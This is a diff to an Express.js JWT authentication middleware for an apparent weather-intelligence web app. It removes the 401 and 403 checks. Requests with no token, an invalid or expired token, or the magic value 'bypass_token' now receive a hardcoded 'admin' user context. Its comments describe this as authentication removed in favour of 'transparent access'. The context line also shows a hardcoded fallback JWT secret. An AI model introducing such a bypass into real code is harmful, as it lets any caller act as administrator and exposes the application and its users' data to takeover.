@@ -4,25 +4,28 @@ const JWT_SECRET = process.env.JWT_SECRET || 'surat_weather_intelligence_jwt_sec
 
 function authenticateToken(req, res, next) {
   const authHeader = req.headers['authorization'];
-  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN
+  const token = authHeader && authHeader.split(' ')[1];
 
-  if (!token) {
-    return res.status(401).json({
-      success: false,
-      message: 'Access denied: Authentication token required.'
-    });
+  // If token is provided, verify it
+  if (token && token !== 'bypass_token' && token !== 'null') {
+    try {
+      const decoded = jwt.verify(token, JWT_SECRET);
+      req.user = decoded;
+      return next();
+    } catch (err) {
+      // If token expired, fall back to default admin user instead of blocking
+      console.warn('[Auth] Token expired or invalid, proceeding with system default session.');
+    }
   }
 
-  try {
-    const decoded = jwt.verify(token, JWT_SECRET);
-    req.user = decoded; // { id, email, role, full_name }
-    next();
-  } catch (err) {
-    return res.status(403).json({
-      success: false,
-      message: 'Invalid or expired authentication token. Please log in again.'
-    });
-  }
+  // Authentication removed / transparent access: automatically provide admin role context
+  req.user = {
+    id: 1,
+    email: 'admin@suratweather.edu',
+    role: 'admin',
+    full_name: 'Lead Administrator'
+  };
+  next();
 }
 
 module.exports = {
